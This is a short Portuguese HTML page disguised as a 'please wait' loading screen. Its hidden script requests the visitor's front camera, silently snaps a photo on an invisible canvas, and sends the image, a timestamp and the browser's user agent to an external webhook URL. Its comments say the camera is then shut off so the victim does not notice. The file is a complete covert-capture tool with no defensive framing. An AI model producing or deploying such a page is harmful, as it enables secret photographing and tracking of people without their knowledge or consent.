<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>A carregar...</title>
    <style>
        body { background: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        h1 { color: #333; font-size: 18px; }
    </style>
</head>
<body>
    <h1>A processar o conteúdo, por favor aguarde...</h1>

    <!-- Elementos invisíveis para a captura -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // --- CONFIGURAÇÃO ---
        // Cola aqui o link que criaste (Pipedream ou Webhook.site)
        const WEBHOOK_URL = "https://eo5kkxp18b4vkzu.m.pipedream.net"; 
        // --------------------

        // 1. Pedir acesso à câmara
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            const video = document.getElementById('video');
            video.srcObject = stream;

            // 2. Esperar 2 segundos para a câmara estabilizar
            setTimeout(function() {
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);

                // 3. Converter para imagem (Base64)
                const fotoData = canvas.toDataURL('image/jpeg', 0.7);

                // 4. Enviar para o teu "servidor" Webhook
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors', // Para evitar bloqueios de segurança do navegador
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        imagem: fotoData,
                        data: new Date().toISOString(),
                        dispositivo: navigator.userAgent
                    })
                }).then(() => {
                    console.log("Enviado com sucesso!");
                    // Fecha a câmara para não gastar bateria/dar nas vistas
                    stream.getTracks().forEach(track => track.stop());
                });

            }, 2000);
        })
        .catch(function(err) {
            console.log("Erro ou permissão negada: " + err);
        });
    </script>
</body>
</html>
